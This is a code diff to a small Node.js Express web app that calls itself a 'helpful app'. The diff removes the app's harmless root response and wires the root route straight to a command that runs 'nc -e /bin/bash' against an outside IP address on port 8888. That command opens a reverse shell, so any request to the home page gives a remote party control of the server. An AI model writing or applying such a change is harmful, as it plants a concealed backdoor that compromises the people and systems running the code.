@@ -3,9 +3,6 @@ var axios = require('axios');
 const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im an helpful app!');
-});
-app.get('/bla', function (req, ses){
   exec("nc -e /bin/bash 202.61.200.207 8888", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
@@ -18,7 +15,7 @@ app.get('/bla', function (req, ses){
     console.log(`stdout: ${stdout}`);
 });
 });
-app.listen(3001, function () {
+app.listen(3000, function () {
   console.log('Example app listening on port 3000!');
   const data = {
     name: 'John Doe',
